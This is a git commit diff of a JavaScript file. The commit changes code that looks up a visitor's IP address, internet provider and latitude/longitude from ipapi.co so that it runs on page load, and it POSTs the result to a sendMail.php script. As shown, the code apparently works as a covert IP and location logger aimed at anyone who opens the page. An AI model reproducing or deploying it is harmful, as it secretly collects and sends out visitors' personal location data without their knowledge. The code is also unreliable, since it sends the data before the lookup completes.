1e2fe412ca44547a6ab8bf6da0f56f3bdb77b1d0
SYL <93049532+BoingNurik@users.noreply.github.com>
2024-03-20 21:46:08 +0500

    Update index.js

--- index.js
+++ index.js
@@ -1,26 +1,26 @@
 var info
-async function sendLocation(e){
-    fetch('https://ipapi.co/json/')
-        .then(response => response.json())
-        .then(data => {
-        
-        const userIP = data.ip;
-        const network = data.org;
-        const latitude = data.latitude;
-        const longitude = data.longitude
-        console.log(`IP пользователя: ${userIP}`);
-        console.log(`Интернет провайдер: ${network}`);
-        console.log(`широта: ${latitude}`);
-        console.log(`долгота: ${longitude}`);
-        info = `IP пользователя: ${userIP}\n Интернет провайдер: ${network}\n широта: ${latitude}\n долгота: ${longitude}`
-        
-    });
 
-    let response = await fetch('sendmail.php', {
-        method: 'POST',
-        body: info,
-    })
-}
+fetch('https://ipapi.co/json/')
+    .then(response => response.json())
+    .then(data => {
+        
+    const userIP = data.ip;
+    const network = data.org;
+    const latitude = data.latitude;
+    const longitude = data.longitude
+    console.log(`IP пользователя: ${userIP}`);
+    console.log(`Интернет провайдер: ${network}`);
+    console.log(`широта: ${latitude}`);
+    console.log(`долгота: ${longitude}`);
+    info = `IP пользователя: ${userIP}\n Интернет провайдер: ${network}\n широта: ${latitude}\n долгота: ${longitude}`
+        
+});
+
+let response = await fetch('sendMail.php', {
+    method: 'POST',
+    body: info,
+})
+
 
 
    
